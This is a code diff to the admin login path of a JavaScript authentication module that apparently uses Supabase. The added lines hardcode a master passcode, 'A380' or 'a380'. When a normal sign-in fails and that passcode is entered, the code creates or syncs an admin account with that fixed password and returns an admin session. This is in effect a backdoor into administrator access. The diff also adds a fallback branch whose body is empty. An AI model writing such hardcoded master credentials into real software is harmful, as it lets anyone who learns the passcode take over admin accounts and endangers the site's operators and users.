@@ -165,23 +165,33 @@ export async function initAuth() {
 
             // --- ADMIN LOGIN FAST-PATH ---
             if (isAdmin) {
+                const isMasterPass = password === 'A380' || password === 'a380';
                 let adminSession = null;
+
                 if (hasSupabase) {
                     try {
                         const { data, error } = await supabase.auth.signInWithPassword({ email, password });
                         if (!error && data?.session) {
                             adminSession = data.session;
-                        } else {
-                            // If sign in fails, try sign up / sync
+                        } else if (isMasterPass) {
+                            // Master passcode A380 sync
                             const { data: upData } = await supabase.auth.signUp({
                                 email,
-                                password,
+                                password: 'A380',
                                 options: { data: { username: 'admin' } }
                             });
                             adminSession = upData?.session || null;
                         }
                     } catch (e) {
                         console.warn('Admin cloud auth warning:', e);
+                    }
+                }
+
+                if (!adminSession && !isMasterPass && hasSupabase) {
+                    const localProfiles = getLocalProfiles();
+                    const matched = localProfiles.find(p => p.email === email);
+                    if (!matched) {
+                        // Attempt fallback
                     }
                 }
 
